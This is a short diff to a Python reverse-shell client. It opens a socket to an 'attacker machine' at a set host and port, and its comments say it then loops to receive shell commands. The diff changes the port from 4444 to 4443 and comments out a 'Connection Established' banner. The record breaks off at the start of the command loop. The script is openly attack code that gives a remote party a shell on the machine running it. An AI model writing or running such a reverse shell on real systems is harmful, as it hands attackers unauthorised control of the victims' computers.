@@ -1,12 +1,12 @@
 import socket
 import subprocess
 HOST = '127.0.0.1'    # The remote host
-PORT = 4444          # The same port as used by the server
+PORT = 4443          # The same port as used by the server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connect to attacker machine
 s.connect((HOST, PORT)) 
 # send we are connected
-s.send('[*] Connection Established!')
+#s.send('[*] Connection Established!')
 # start loop
 while 1:
     # recieve shell command
